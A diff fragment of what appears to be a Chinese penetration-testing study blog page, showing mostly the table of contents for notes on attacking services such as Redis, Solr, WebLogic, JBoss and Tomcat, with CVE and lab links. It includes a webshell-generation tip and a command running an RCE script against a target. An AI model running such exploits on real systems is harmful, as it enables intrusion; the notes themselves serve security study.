href="#%E5%AD%98%E5%82%A8%E5%BA%93%E9%AA%8C%E8%AF%81%E5%B9%B6%E5%88%9B%E5%BB%BA"><span class="toc-number"></span> <span class="toc-text"> 存储库验证并创建:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96elasticsearch-%E6%BC%8F%E6%B4%9Ehttpsvulhuborgenvironmentselasticsearch"><span class="toc-number"></span> <span class="toc-text"> 其他 elasticSearch 漏洞：https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;elasticsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> 3.2 应用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#321-ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95%E5%8F%8Aproftepd%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text"> 3.2.1 ftp 匿名登录及 proftepd 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ftp%E7%9A%84%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95%E4%B8%80%E8%88%AC%E6%9C%89%E4%B8%89%E7%A7%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text"> （ 1 ）FTP 的匿名登录一般有三种</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E8%BF%99%E4%BA%9B%E6%BC%8F%E6%B4%9E%E6%97%B6%E9%9C%80%E8%A6%81%E8%87%AA%E8%A1%8C%E5%AF%BB%E6%89%BE%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number"></span> <span class="toc-text"> 遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#322-rsync%E5%A4%87%E4%BB%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E5%8F%8Arce"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.2.2 rsync 备份未授权及 RCE</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%85%E8%A7%A3%E5%86%B3linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84etccrontab%E4%B8%8Eetccronhourly%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number"></span> <span class="toc-text"> 待解决：linux 计划任务是怎么工作的？&#x2F;etc&#x2F;crontab 与 &#x2F;etc&#x2F;cron.hourly 的关系</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcomwgpsecfofa_viewer"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;wgpsec&#x2F;fofa_viewer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#323-ssh%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%8F%8Alibssh%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.2.3 ssh 用户名枚举及 libssh 权限认证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ssh%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.1.1.</span> <span class="toc-text"> （ 1 ）SSH 协议漏洞：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2014-0160-%E7%89%88%E6%9C%AC%E5%BE%88%E5%B0%91%E9%83%BD%E8%A2%AB%E4%BF%AE%E5%A4%8D%E4%BA%86cve_2020_15778-%E4%BB%B7%E5%80%BC%E4%B8%8D%E9%AB%98"><span class="toc-number">0.1.2.</span> <span class="toc-text"> CVE- 2014 - 0160 版本很少，都被修复了；CVE_2020_15778 价值不高</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcomvulhubvulhubblobmasterlibsshcve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;libssh&#x2F;CVE- 2018 - 10933&#x2F;README.zh-cn.md</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#324-%E5%90%91%E6%97%A5%E8%91%B5rce-vnc%E5%8F%A3%E4%BB%A4"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.2.4 向日葵 RCE、vnc 口令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%90%91%E6%97%A5%E8%91%B5-rce"><span class="toc-number">0.1.1.</span> <span class="toc-text"> （ 1 ）向日葵 RCE：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#325-teamviewer%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB"><span class="toc-number">0.2.</span> <span class="toc-text"> 3.2.5 teamviewer 配合 xss 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E8%B0%83%E7%94%A8%E9%99%A4%E4%BA%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E9%85%8D%E5%90%88xss%E6%88%96%E8%80%85%E9%92%93%E9%B1%BC%E4%BD%BF%E7%94%A8"><span class="toc-number">0.2.1.</span> <span class="toc-text"> 通过网页调用除了命令执行，可以执行任意命令，配合 XSS 或者钓鱼使用，</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#326-zabbix%E6%9C%AA%E6%8E%88%E6%9D%83%E5%8F%8A%E5%90%8E%E5%8F%B0rce"><span class="toc-number">0.3.</span> <span class="toc-text"> 3.2.6 zabbix 未授权及后台 rce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">0.3.1.</span> <span class="toc-text"> # 手动复现：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#327-kibana%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.4.</span> <span class="toc-text"> 3.2.7 Kibana 任意代码执行漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcomvulhubvulhubblobmasterkibanacve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;kibana&#x2F;CVE- 2019 - 7609&#x2F;README.zh-cn.md</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#33-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text"> 3.3 中间件安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#331-nginx%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text"> 3.3.1 nginx 文件解析漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentsnginxnginx_parsing_vulnerability"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;nginx&#x2F;nginx_parsing_vulnerability&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentsnginxcve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;nginx&#x2F;CVE- 2013 - 4547&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#332-apache-rce-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.2 apache RCE、目录遍历、文件解析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-cve-2021-41773"><span class="toc-number">0.1.1.</span> <span class="toc-text"> （ 1 ）CVE- 2021 - 41773</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%9C%B0%E5%9D%80httpsgithubcominbug-teamcve-2021-41773_cve-2021-42013"><span class="toc-number"></span> <span class="toc-text"> 工具地址：https:&#x2F;&#x2F;github.com&#x2F;inbug-team&#x2F;CVE- 2021 - 41773_CVE- 2021 - 42013</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentshttpdcve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;httpd&#x2F;CVE- 2017 - 15715&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91%E9%99%90%E5%88%B6-10-m%E5%8F%AF%E5%88%A9%E7%94%A8%E6%AD%A4%E6%96%B9%E6%B3%95%E6%8B%86%E5%88%86%E5%90%8E%E4%B8%80%E4%B8%80%E7%BF%BB%E8%AF%91%E5%9C%A8%E5%90%88%E5%B9%B6"><span class="toc-number"></span> <span class="toc-text"> 谷歌翻译限制 10 M，可利用此方法拆分后一一翻译在合并</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#333-tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E5%8C%85%E5%90%AB"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.3 tomcat 弱口令、文件上传及包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3"><span class="toc-number">0.1.1.</span> <span class="toc-text"> （ 1 ）弱口令猜解</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%96%E8%80%85%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%93%A5%E6%96%AF%E6%8B%89%E7%94%9F%E6%88%90jsp%E7%9A%84java%E6%9C%A8%E9%A9%AC%E5%9C%A8%E5%8E%8B%E7%BC%A9%E6%88%90zip%E6%9C%80%E5%90%8E%E6%94%B9%E5%90%8D%E4%B8%BAwar%E5%90%8E%E7%BC%80"><span class="toc-number"></span> <span class="toc-text"> 或者可以利用哥斯拉生成 jsp 的 java 木马，在压缩成 zip 最后改名为 war 后缀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcombeichendreamgodzilla"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;BeichenDream&#x2F;Godzilla</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#334-weblogic%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bldap%E5%AF%BC%E8%87%B4rce"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.4 weblogic 加载远程 ldap 导致 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2021-2394"><span class="toc-number">0.1.1.</span> <span class="toc-text"> CVE- 2021 - 2394</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsblogcsdnnetm0_51330619articledetails120254124"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_51330619&#x2F;article&#x2F;details&#x2F;120254124</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#335-jboss%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.5 jboss 弱口令及反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2017-12149"><span class="toc-number">0.1.1.</span> <span class="toc-text"> CVE- 2017 - 12149</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcomvulhubvulhubtreemasterjbosscve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;jboss&#x2F;CVE- 2017 - 12149</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2017-7504"><span class="toc-number">0.0.1.</span> <span class="toc-text"> CVE- 2017 - 7504</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E4%B8%8E%E4%B8%8A%E5%B7%AE%E4%B8%8D%E5%A4%9A%E5%94%AF%E4%B8%80%E5%8C%BA%E5%88%AB%E5%9C%A8%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E5%9C%B0%E5%9D%80"><span class="toc-number">0.0.2.</span> <span class="toc-text"> 漏洞复现过程与上差不多，唯一区别在于数据发送地址</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#336-jenkins%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.6 Jenkins 相关漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsgithubcomadamyordancve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;github.com&#x2F;adamyordan&#x2F;cve- 2019 - 1003000 - jenkins-rce-poc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#337-glassfish%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.7 glassfish 弱口令、敏感文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#338-docker%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">0.2.</span> <span class="toc-text"> 3.3.8 docker 逃逸基础知识</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E4%B8%AA%E7%96%91%E9%97%AElinux%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E6%98%AF%E6%80%8E%E4%B9%88%E6%A0%B7%E7%9A%84"><span class="toc-number"></span> <span class="toc-text"> 有个疑问，linux 的计划任务目录结构是怎么样的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#339-websphere%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.9 websphere 反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2015-7450"><span class="toc-number">0.1.1.</span> <span class="toc-text"> CVE- 2015 - 7450</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cve-2020-4450-%E6%97%A0%E5%88%A9%E7%94%A8pocexp"><span class="toc-number"></span> <span class="toc-text"> CVE- 2020 - 4450 ：无利用 POC&#x2F;EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3310-jetty%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.3.10 jetty 文件读取漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text"> 3.4 框架安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#341-php%E6%A1%86%E6%9E%B6-thinkphp-laravel"><span class="toc-number">1.1.</span> <span class="toc-text"> 3.4.1 PHP 框架 - thinkphp laravel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#342-java%E6%A1%86%E6%9E%B6-spring-struts2"><span class="toc-number">1.2.</span> <span class="toc-text"> 3.4.2 JAVA 框架 - Spring Struts2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#343-javascript%E6%A1%86%E6%9E%B6nodejsjquery"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.4.3 javascript 框架 node.js&#x2F;jquery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#344-python%E6%A1%86%E6%9E%B6django-flask"><span class="toc-number">1.4.</span> <span class="toc-text"> 3.4.4 python 框架 django flask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#345-java-apache%E6%A1%86%E6%9E%B6shirosorl"><span class="toc-number">1.5.</span> <span class="toc-text"> 3.4.5 java- apache 框架 Shiro&#x2F;Sorl</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentssolrcve-"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;solr&#x2F;CVE- 2017 - 12629 - RCE&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentssolrcve--2"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;solr&#x2F;CVE- 2019 - 0193&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#httpsvulhuborgenvironmentssolrremote-streaming-fileread"><span class="toc-number"></span> <span class="toc-text"> https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;solr&#x2F;Remote-Streaming-Fileread&#x2F;</span></a>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text"> 数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> mysql 未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hadoop%E6%9C%AA%E6%8E%88%E6%9D%83-rce"><span class="toc-number">1.2.</span> <span class="toc-text"> hadoop 未授权 RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis-%E5%86%99%E5%AE%9A%E6%97%B6-%E5%86%99%E5%85%AC%E9%92%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> redis 写定时 写公钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#influxdb-jwt%E4%BC%AA%E9%80%A0%E8%BA%AB%E4%BB%BD"><span class="toc-number">1.4.</span> <span class="toc-text"> influxdb jwt 伪造身份</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#h2-database-jndi%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> h2 database jndi 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#couchdb-%E7%BA%B5%E5%90%91%E6%9D%83%E9%99%90"><span class="toc-number">1.6.</span> <span class="toc-text"> Couchdb 纵向权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#es-%E5%86%99-webshell"><span class="toc-number">1.7.</span> <span class="toc-text"> es 写 webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text"> 应用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text"> ftp 匿名登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rsync-%E6%9C%AA%E6%8E%88%E6%9D%83-rce"><span class="toc-number">2.2.</span> <span class="toc-text"> rsync 未授权 RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E6%9E%9A%E4%B8%BE-libssh%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text"> ssh 枚举 libssh 认证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5rce-vnc%E5%8F%A3%E4%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text"> 向日葵 RCE、vnc 口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#teamviewer-xss%E6%94%BB%E5%87%BB"><span class="toc-number">2.5.</span> <span class="toc-text"> teamviewer xss 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zabbix-%E6%9C%AA%E6%8E%88%E6%9D%83-rce"><span class="toc-number">2.6.</span> <span class="toc-text"> zabbix 未授权 rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kibana-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.7.</span> <span class="toc-text"> Kibana 任意代码执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text"> 中间件安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text"> nginx 文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apache-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90-rce"><span class="toc-number">3.2.</span> <span class="toc-text"> apache 文件解析 rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB"><span class="toc-number">3.3.</span> <span class="toc-text"> tomcat 弱口令 上传 包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weblogic-%E5%8A%A0%E8%BD%BDldap"><span class="toc-number">3.4.</span> <span class="toc-text"> weblogic 加载 ldap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jboss-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.5.</span> <span class="toc-text"> jboss 弱口令 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jenkins-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text"> Jenkins 相关漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glassfish-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.7.</span> <span class="toc-text"> glassfish 弱口令 信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker-%E9%80%83%E9%80%B8"><span class="toc-number">3.8.</span> <span class="toc-text"> docker 逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#websphere-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.9.</span> <span class="toc-text"> websphere 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jetty-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.10.</span> <span class="toc-text"> jetty 文件读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="toc-number">4.</span> <span class="toc-text"> 框架安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#thinkphp-laravel"><span class="toc-number">4.1.</span> <span class="toc-text"> Thinkphp Laravel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spring-struts2"><span class="toc-number">4.2.</span> <span class="toc-text"> Spring Struts2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nodejs-jquery"><span class="toc-number">4.3.</span> <span class="toc-text"> Node.js Jquery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#django-flask"><span class="toc-number">4.4.</span> <span class="toc-text"> Django Flask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro-sorl"><span class="toc-number">4.5.</span> <span class="toc-text"> Shiro Sorl</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/03/18/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2023/07/04/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li><a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li class="active"><a href="/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2023/07/04/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2023/07/04/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -926,7 +591,7 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">166</span>
+        <span class="count">167</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -938,7 +603,7 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
     </div>
     <div class="item tags">
       <a href="/tags/">
-        <span class="count">40</span>
+        <span class="count">39</span>
         <span class="name">标签</span>
       </a>
     </div>
